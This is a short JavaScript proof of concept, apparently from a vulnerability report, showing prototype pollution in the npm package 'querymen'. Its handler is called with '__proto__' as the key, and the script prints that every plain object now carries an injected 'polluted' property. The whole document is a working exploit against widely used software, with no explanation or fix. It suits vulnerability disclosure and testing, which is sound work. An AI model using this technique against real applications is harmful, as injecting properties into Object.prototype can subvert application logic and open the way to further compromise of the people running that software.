var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
var a = require('querymen');
obj = {};
console.log({}.polluted);
a.handler('__proto__', 'polluted', 'yes');
console.log({}.polluted);